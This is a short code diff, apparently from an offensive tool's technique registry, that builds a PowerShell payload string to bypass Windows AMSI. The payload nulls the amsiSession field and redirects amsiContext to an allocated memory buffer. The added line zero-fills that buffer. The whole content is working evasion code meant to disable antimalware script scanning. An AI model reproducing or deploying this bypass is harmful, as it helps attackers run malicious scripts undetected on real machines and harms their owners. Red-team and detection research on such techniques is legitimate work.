@@ -208,6 +208,7 @@ TechniqueRegistry.register({
     const raw =
       genAsmLookup(vAsm, vType, vBf) +
       `$${vMem}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);` +
+      `[System.Runtime.InteropServices.Marshal]::Copy([byte[]]::new(9076),0,$${vMem},9076);` +
       `$${vType}.GetField('amsiSession',$${vBf}).SetValue($null,$null);` +
       `$${vType}.GetField('amsiContext',$${vBf}).SetValue($null,[IntPtr]$${vMem})`;
     return createPayload({
